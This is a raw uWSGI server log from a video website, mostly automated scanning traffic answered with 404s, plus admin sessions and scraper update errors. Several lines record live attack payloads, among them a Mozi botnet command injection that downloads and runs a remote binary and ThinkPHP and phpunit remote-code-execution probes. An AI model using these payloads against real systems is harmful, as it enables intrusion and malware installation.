[1619366401] ./uwsgi.log reopened.
[pid: 233988|app: 0|req: 4551/11548] 204.195.116.171 () {34 vars in 656 bytes} [Mon Apr 26 01:55:02 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://204.195.116.171:60683/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
invalid request block size: 7156 (max 4096)...skip
[pid: 233988|app: 0|req: 4552/11549] 45.155.205.27 () {38 vars in 713 bytes} [Mon Apr 26 02:44:32 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2180/11550] 45.155.205.27 () {38 vars in 611 bytes} [Mon Apr 26 02:44:32 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4553/11551] 45.155.205.27 () {36 vars in 625 bytes} [Mon Apr 26 02:44:32 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2680/11552] 45.155.205.27 () {34 vars in 557 bytes} [Mon Apr 26 02:44:32 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2681/11553] 45.155.205.27 () {34 vars in 721 bytes} [Mon Apr 26 02:44:33 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2140/11554] 45.155.205.27 () {36 vars in 654 bytes} [Mon Apr 26 02:44:33 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2181/11555] 45.155.205.27 () {34 vars in 557 bytes} [Mon Apr 26 02:44:33 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4554/11556] 45.155.205.27 () {34 vars in 588 bytes} [Mon Apr 26 02:44:33 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2141/11557] 45.155.205.27 () {34 vars in 514 bytes} [Mon Apr 26 02:44:34 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2142/11558] 45.155.205.27 () {38 vars in 637 bytes} [Mon Apr 26 02:44:34 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2682/11559] 45.155.205.27 () {36 vars in 603 bytes} [Mon Apr 26 02:44:34 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
invalid request block size: 6205 (max 4096)...skip
[pid: 233989|app: 0|req: 2683/11560] 41.207.250.246 () {32 vars in 467 bytes} [Mon Apr 26 03:18:11 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2684/11561] 186.33.126.68 () {32 vars in 465 bytes} [Mon Apr 26 03:26:29 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2685/11562] 144.91.73.82 () {36 vars in 524 bytes} [Mon Apr 26 03:33:06 2021] GET /.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2143/11563] 144.91.73.82 () {40 vars in 631 bytes} [Mon Apr 26 03:33:07 2021] POST / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2686/11564] 168.232.13.150 () {32 vars in 466 bytes} [Mon Apr 26 04:11:44 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2687/11565] 118.126.124.74 () {38 vars in 607 bytes} [Mon Apr 26 04:33:39 2021] GET /sql/sql-admin/index.php?lang%3Den => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2688/11566] 41.79.234.90 () {32 vars in 471 bytes} [Mon Apr 26 05:29:19 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2144/11567] 164.132.43.93 () {34 vars in 562 bytes} [Mon Apr 26 07:20:17 2021] GET /db/phpmyadmin3/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2182/11568] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:17 2021] GET /PMA2014/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4555/11569] 164.132.43.93 () {34 vars in 560 bytes} [Mon Apr 26 07:20:18 2021] GET /db/phpMyAdmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2689/11570] 164.132.43.93 () {34 vars in 554 bytes} [Mon Apr 26 07:20:19 2021] GET /phpMyAdmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2183/11571] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:21 2021] GET /pma2021/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2145/11572] 164.132.43.93 () {34 vars in 564 bytes} [Mon Apr 26 07:20:21 2021] GET /db/phpMyAdmin-3/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2146/11573] 164.132.43.93 () {34 vars in 562 bytes} [Mon Apr 26 07:20:22 2021] GET /phpmyadmin2018/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2690/11574] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:23 2021] GET /pma2021/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2691/11575] 164.132.43.93 () {34 vars in 550 bytes} [Mon Apr 26 07:20:24 2021] GET /mysql/db/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2184/11576] 164.132.43.93 () {34 vars in 558 bytes} [Mon Apr 26 07:20:24 2021] GET /phpMyAdmin-3/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2147/11577] 164.132.43.93 () {34 vars in 562 bytes} [Mon Apr 26 07:20:25 2021] GET /phpmyadmin2021/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2692/11578] 164.132.43.93 () {34 vars in 552 bytes} [Mon Apr 26 07:20:28 2021] GET /admin/pMA/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4556/11579] 164.132.43.93 () {34 vars in 568 bytes} [Mon Apr 26 07:20:29 2021] GET /administrator/PMA/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4557/11580] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:30 2021] GET /pma2014/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4558/11581] 164.132.43.93 () {34 vars in 560 bytes} [Mon Apr 26 07:20:32 2021] GET /db/phpMyAdmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2185/11582] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:32 2021] GET /PMA2018/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2186/11583] 164.132.43.93 () {34 vars in 566 bytes} [Mon Apr 26 07:20:34 2021] GET /admin/phpMyAdmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2148/11584] 164.132.43.93 () {34 vars in 566 bytes} [Mon Apr 26 07:20:35 2021] GET /mysql/sqlmanager/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2187/11585] 164.132.43.93 () {34 vars in 564 bytes} [Mon Apr 26 07:20:36 2021] GET /sql/phpMyAdmin2/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2693/11586] 164.132.43.93 () {34 vars in 552 bytes} [Mon Apr 26 07:20:37 2021] GET /db/websql/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4559/11587] 164.132.43.93 () {34 vars in 556 bytes} [Mon Apr 26 07:20:39 2021] GET /phpMyAdmin1/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2188/11588] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:40 2021] GET /PMA2016/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2189/11589] 164.132.43.93 () {34 vars in 556 bytes} [Mon Apr 26 07:20:40 2021] GET /2phpmyadmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2694/11590] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:42 2021] GET /PMA2015/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2695/11591] 164.132.43.93 () {34 vars in 540 bytes} [Mon Apr 26 07:20:43 2021] GET /PMA/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2696/11592] 164.132.43.93 () {34 vars in 548 bytes} [Mon Apr 26 07:20:45 2021] GET /pma2021/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4560/11593] 31.30.81.80 () {34 vars in 550 bytes} [Mon Apr 26 08:07:08 2021] GET /sql/webdb/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2697/11594] 31.30.81.80 () {34 vars in 560 bytes} [Mon Apr 26 08:07:08 2021] GET /db/phpMyAdmin3/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2190/11595] 31.30.81.80 () {34 vars in 552 bytes} [Mon Apr 26 08:07:09 2021] GET /sql/sqlweb/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2149/11596] 31.30.81.80 () {34 vars in 552 bytes} [Mon Apr 26 08:07:10 2021] GET /phpMyadmin/index.php?lang=en => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4561/11597] 186.33.99.239 () {32 vars in 466 bytes} [Mon Apr 26 10:51:34 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4562/11598] 192.241.214.40 () {34 vars in 396 bytes} [Mon Apr 26 12:01:23 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2150/11599] 80.82.77.192 () {34 vars in 488 bytes} [Mon Apr 26 12:22:00 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2151/11600] 109.175.7.90 () {32 vars in 464 bytes} [Mon Apr 26 12:48:58 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2152/11601] 220.194.106.61 () {38 vars in 628 bytes} [Mon Apr 26 12:51:50 2021] GET /pmd/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4563/11602] 118.126.124.198 () {38 vars in 569 bytes} [Mon Apr 26 12:51:51 2021] GET /pmd/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2153/11603] 101.89.19.140 () {38 vars in 3413 bytes} [Mon Apr 26 13:53:47 2021] GET /.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4564/11604] 221.182.235.190 () {36 vars in 565 bytes} [Mon Apr 26 15:42:15 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4565/11605] 184.105.247.196 () {28 vars in 311 bytes} [Mon Apr 26 17:17:03 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4566/11606] 45.229.54.23 () {34 vars in 647 bytes} [Mon Apr 26 17:43:42 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.229.54.23:36640/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4567/11607] 39.109.113.109 () {38 vars in 578 bytes} [Mon Apr 26 18:39:27 2021] POST /phpmyadmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4568/11608] 81.162.67.81 () {32 vars in 471 bytes} [Mon Apr 26 18:52:58 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4569/11609] 118.126.124.172 () {38 vars in 555 bytes} [Mon Apr 26 19:40:50 2021] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4570/11610] 111.7.96.142 () {42 vars in 606 bytes} [Mon Apr 26 20:26:27 2021] HEAD / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2698/11611] 111.7.96.142 () {44 vars in 630 bytes} [Mon Apr 26 20:26:28 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2191/11612] 111.7.96.142 () {44 vars in 652 bytes} [Mon Apr 26 20:26:28 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2192/11613] 183.27.46.185 () {42 vars in 788 bytes} [Mon Apr 26 21:10:57 2021] GET /video/type/1/ => generated 34780 bytes in 337 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4571/11614] 183.27.46.185 () {44 vars in 950 bytes} [Mon Apr 26 21:11:03 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 18901 bytes in 57 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4572/11615] 183.27.46.185 () {44 vars in 903 bytes} [Mon Apr 26 21:11:06 2021] GET /video/play/84919/ => generated 17868 bytes in 8 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4573/11616] 183.27.46.185 () {42 vars in 774 bytes} [Mon Apr 26 21:11:28 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 7 headers in 210 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2699/11617] 183.27.46.185 () {42 vars in 794 bytes} [Mon Apr 26 21:11:28 2021] GET /admin/login.html => generated 5722 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2154/11618] 183.27.46.185 () {50 vars in 1018 bytes} [Mon Apr 26 21:11:30 2021] POST /admin/login.html => generated 63 bytes in 14 msecs (HTTP/1.1 200) 7 headers in 324 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2155/11619] 183.27.46.185 () {44 vars in 872 bytes} [Mon Apr 26 21:11:30 2021] GET /admin/ => generated 30384 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4574/11620] 183.27.46.185 () {44 vars in 880 bytes} [Mon Apr 26 21:11:37 2021] GET /admin/view_log/ => generated 18532 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4575/11621] 183.27.46.185 () {44 vars in 902 bytes} [Mon Apr 26 21:11:40 2021] GET /admin/view_log/?page=1 => generated 18580 bytes in 3 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2700/11622] 183.27.46.185 () {44 vars in 916 bytes} [Mon Apr 26 21:11:41 2021] GET /admin/view_log/2021-04-25 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 195 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2193/11623] 183.27.46.185 () {44 vars in 918 bytes} [Mon Apr 26 21:11:41 2021] GET /admin/view_log/2021-04-25/ => generated 18252 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2194/11624] 183.27.46.185 () {44 vars in 920 bytes} [Mon Apr 26 21:11:44 2021] GET /admin/view_log/2021-04-24 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 195 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2701/11625] 183.27.46.185 () {44 vars in 922 bytes} [Mon Apr 26 21:11:45 2021] GET /admin/view_log/2021-04-24/ => generated 18911 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2702/11626] 183.27.46.185 () {44 vars in 920 bytes} [Mon Apr 26 21:11:48 2021] GET /admin/view_log/2021-04-23 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 5 headers in 195 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2195/11627] 183.27.46.185 () {44 vars in 922 bytes} [Mon Apr 26 21:11:48 2021] GET /admin/view_log/2021-04-23/ => generated 21133 bytes in 8 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2703/11628] 183.27.46.185 () {44 vars in 884 bytes} [Mon Apr 26 21:12:02 2021] GET /admin/update_log/ => generated 21373 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 233990|app: 0|req: 2156/11629] 183.27.46.185 () {44 vars in 910 bytes} [Mon Apr 26 21:12:07 2021] GET /admin/update_log/?page=35 => generated 18008 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2157/11630] 183.27.46.185 () {44 vars in 918 bytes} [Mon Apr 26 21:12:10 2021] GET /admin/update_log/?page=34 => generated 21225 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 233991|app: 0|req: 2196/11631] 183.27.46.185 () {44 vars in 907 bytes} [Mon Apr 26 21:12:21 2021] GET /admin/update_video/ => generated 19539 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
--------2021-04-26 21:12:25 站点1开始更新--------
Exception: not enough arguments for format string
[pid: 233989|app: 0|req: 2704/11632] 183.27.46.185 () {44 vars in 921 bytes} [Mon Apr 26 21:12:25 2021] GET /admin/update/?url_index=1&type=today => generated 93 bytes in 282 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 0)
--------2021-04-26 21:12:29 站点1开始更新--------
Exception: not enough arguments for format string
[pid: 233988|app: 0|req: 4576/11633] 183.27.46.185 () {44 vars in 921 bytes} [Mon Apr 26 21:12:29 2021] GET /admin/update/?url_index=1&type=count => generated 93 bytes in 19 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4577/11634] 183.27.46.185 () {44 vars in 907 bytes} [Mon Apr 26 21:12:32 2021] GET /admin/update_video/ => generated 19539 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
--------2021-04-26 21:12:34 站点2开始更新--------
爬虫网站http://cj.bajiecaiji.com/返回状态码错误：403 proxy: 
[pid: 233991|app: 0|req: 2197/11635] 183.27.46.185 () {44 vars in 907 bytes} [Mon Apr 26 21:12:39 2021] GET /admin/update_video/ => generated 19539 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
--------2021-04-26 21:12:40 站点1开始更新--------
Exception: not enough arguments for format string
[pid: 233988|app: 0|req: 4578/11636] 183.27.46.185 () {44 vars in 921 bytes} [Mon Apr 26 21:12:40 2021] GET /admin/update/?url_index=1&type=count => generated 93 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 0)
已更新480条数据
--------2021-04-26 21:13:16 站点2更新完成--------
[pid: 233989|app: 0|req: 2705/11637] 183.27.46.185 () {44 vars in 921 bytes} [Mon Apr 26 21:12:34 2021] GET /admin/update/?url_index=2&type=today => generated 82 bytes in 41964 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4579/11638] 107.151.182.62 () {34 vars in 490 bytes} [Mon Apr 26 21:18:59 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4580/11639] 183.27.45.201 () {46 vars in 900 bytes} [Mon Apr 26 21:30:17 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 7 headers in 210 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2706/11640] 183.27.45.201 () {46 vars in 920 bytes} [Mon Apr 26 21:30:17 2021] GET /admin/login.html => generated 5722 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4581/11641] 183.27.45.201 () {52 vars in 1018 bytes} [Mon Apr 26 21:30:42 2021] POST /admin/login.html => generated 63 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 324 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4582/11642] 183.27.45.201 () {46 vars in 944 bytes} [Mon Apr 26 21:30:42 2021] GET /admin/ => generated 30384 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4583/11643] 183.27.45.201 () {46 vars in 934 bytes} [Mon Apr 26 21:34:41 2021] GET /video/ => generated 64204 bytes in 258 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4584/11644] 183.27.45.201 () {44 vars in 912 bytes} [Mon Apr 26 21:34:47 2021] GET /video/play/95617/ => generated 14695 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2707/11645] 183.27.45.201 () {46 vars in 983 bytes} [Mon Apr 26 21:35:04 2021] GET /video/play/95617/2-1.html => generated 14626 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2708/11646] 183.27.45.201 () {46 vars in 991 bytes} [Mon Apr 26 21:39:10 2021] GET /video/play/95617/1-1.html => generated 14695 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4585/11647] 183.27.45.201 () {46 vars in 967 bytes} [Mon Apr 26 21:39:48 2021] GET /video/type/1/ => generated 34780 bytes in 259 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4586/11648] 183.27.45.201 () {46 vars in 1030 bytes} [Mon Apr 26 21:40:00 2021] GET /video/type/1/?area=%E7%BE%8E%E5%9B%BD&year=&rating= => generated 46440 bytes in 116 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4587/11649] 183.27.45.201 () {46 vars in 1003 bytes} [Mon Apr 26 21:40:03 2021] GET /video/play/104793/ => generated 14131 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4588/11650] 183.27.45.201 () {46 vars in 946 bytes} [Mon Apr 26 22:02:13 2021] GET /video/ => generated 64204 bytes in 246 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 233988|app: 0|req: 4589/11651] 183.27.45.201 () {44 vars in 912 bytes} [Mon Apr 26 22:02:18 2021] GET /video/play/89925/ => generated 14094 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233989|app: 0|req: 2709/11652] 183.27.45.201 () {46 vars in 943 bytes} [Mon Apr 26 22:02:28 2021] GET /video/play/89925/ => generated 14094 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 233988|app: 0|req: 4590/11653] 45.155.205.27 () {38 vars in 713 bytes} [Mon Apr 26 22:11:08 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2710/11654] 45.155.205.27 () {38 vars in 611 bytes} [Mon Apr 26 22:11:08 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 233989|app: 0|req: 2711/11655] 45.155.205.27 () {36 vars in 625 bytes} [Mon Apr 26 22:11:08 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2198/11656] 45.155.205.27 () {34 vars in 557 bytes} [Mon Apr 26 22:11:08 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233990|app: 0|req: 2158/11657] 45.155.205.27 () {34 vars in 721 bytes} [Mon Apr 26 22:11:09 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 233991|app: 0|req: 2199/11658] 45.155.205.27 () {34 vars in 588 bytes} [Mon Apr 26 22:11:09 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
